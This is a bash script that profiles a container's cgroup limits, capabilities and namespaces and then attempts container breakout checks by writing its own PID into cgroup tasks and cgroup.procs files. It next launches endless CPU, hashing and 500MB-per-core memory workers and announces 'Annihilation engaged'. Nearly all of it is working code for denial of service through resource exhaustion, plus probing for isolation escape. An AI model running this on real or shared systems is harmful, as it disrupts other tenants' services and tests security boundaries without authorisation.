#!/bin/bash

cpu_burner() {
    local cores=$(nproc 2>/dev/null || echo 1)
    echo "[*] Spawning $cores CPU burners (π calculation via bc)..."
    for i in $(seq 1 "$cores"); do
        (
            while true; do
                echo "scale=5000; 4*a(1)" | bc -l >/dev/null 2>&1
            done
        ) &
    done
}

crypto_grinder() {
    local cores=$(nproc 2>/dev/null || echo 1)
    echo "[*] Spawning $cores crypto grinders (sha512 /dev/urandom)..."
    for i in $(seq 1 "$cores"); do
        (
            while true; do
                head -c 1000000 /dev/urandom | sha512sum >/dev/null 2>&1
            done
        ) &
    done
}

memory_pressure() {
    local cores=$(nproc 2>/dev/null || echo 1)
    if ! command -v python3 >/dev/null 2>&1; then
        echo "[!] python3 not found — memory_pressure skipped"
        return
    fi
    echo "[*] Spawning $cores memory pressure workers (500MB each)..."
    for i in $(seq 1 "$cores"); do
        (
            python3 -c "
import os, sys
data = bytearray(500 * 1024 * 1024)
while True:
    for i in range(0, len(data), 4096):
        data[i] = (data[i] + 1) % 256
" >/dev/null 2>&1
        ) &
    done
}

container_analysis() {
    echo "[*] Analyzing container constraints..."
    
    local CGROUP_V2=false
    if [[ -f /sys/fs/cgroup/cgroup.controllers ]]; then
        CGROUP_V2=true
        echo "[+] Cgroup v2 detected (unified hierarchy)"
    else
        echo "[+] Cgroup v1 detected (legacy hierarchy)"
    fi

    if [[ "$CGROUP_V2" == true ]]; then
        if [[ -r /sys/fs/cgroup/memory.max ]]; then
            local mem_limit=$(cat /sys/fs/cgroup/memory.max 2>/dev/null)
            echo "[*] Memory limit: $mem_limit bytes (max = unlimited)"
        fi
        if [[ -r /sys/fs/cgroup/cpu.max ]]; then
            local cpu_limit=$(cat /sys/fs/cgroup/cpu.max 2>/dev/null)
            echo "[*] CPU limit: $cpu_limit (quota period)"
        fi
    else
        if [[ -r /sys/fs/cgroup/memory/memory.limit_in_bytes ]]; then
            local mem_limit=$(cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null)
            echo "[*] Memory limit: $mem_limit bytes"
        fi
        if [[ -r /sys/fs/cgroup/cpu/cpu.cfs_quota_us ]]; then
            local cpu_quota=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null)
            local cpu_period=$(cat /sys/fs/cgroup/cpu/cpu.cfs_period_us 2>/dev/null)
            echo "[*] CPU quota: $cpu_quota / $cpu_period us"
        fi
    fi

    if command -v capsh >/dev/null 2>&1; then
        local caps=$(capsh --print 2>/dev/null | grep -o 'cap_[a-z_]*' | tr '\n' ' ')
        echo "[*] Capabilities: $caps"
    else
        echo "[-] capsh not available — cannot enumerate capabilities"
    fi

    if [[ -e /dev/sda ]] || [[ -e /dev/kmsg ]]; then
        echo "[!] Likely privileged container (host devices visible)"
    else
        echo "[*] Unprivileged container (no host devices)"
    fi

    if [[ -e /proc/1/ns/pid ]] && [[ -e /proc/self/ns/pid ]]; then
        if diff /proc/1/ns/pid /proc/self/ns/pid >/dev/null 2>&1; then
            echo "[+] Host PID namespace (privileged or host mode)"
        else
            echo "[*] Isolated PID namespace"
        fi
    fi

    echo "[*] Breakout assessment:"
    local breakout_possible=false
    
    if [[ "$CGROUP_V2" == false ]]; then
        for ctrl in cpu cpuacct cpuset memory; do
            local path="/sys/fs/cgroup/$ctrl/tasks"
            if [[ -w "$path" ]] && echo $$ > "$path" 2>/dev/null; then
                echo "[!] Cgroup v1 escape possible: $path"
                breakout_possible=true
            fi
        done
    fi
    
    if [[ -w /sys/fs/cgroup/cgroup.procs ]] && echo $$ > /sys/fs/cgroup/cgroup.procs 2>/dev/null; then
        echo "[!] Cgroup v2 root escape possible"
        breakout_possible=true
    fi
    
    if command -v capsh >/dev/null 2>&1 && capsh --print 2>/dev/null | grep -q "cap_sys_admin"; then
        echo "[!] CAP_SYS_ADMIN present — remount possible"
        breakout_possible=true
    fi
    
    if [[ "$breakout_possible" == false ]]; then
        echo "[-] No breakout vectors available on this system"
        echo "[*] This is normal for modern, properly configured containers"
    fi
}

container_analysis
echo ""

echo "[*] Initiating resource exhaustion..."
cpu_burner
crypto_grinder
memory_pressure

echo "[*] Annihilation engaged. Monitor with: top, docker stats, or kubectl top"
echo "[*] Stop with: pkill -9 -f 'bc -l\\|sha512sum\\|python3'"
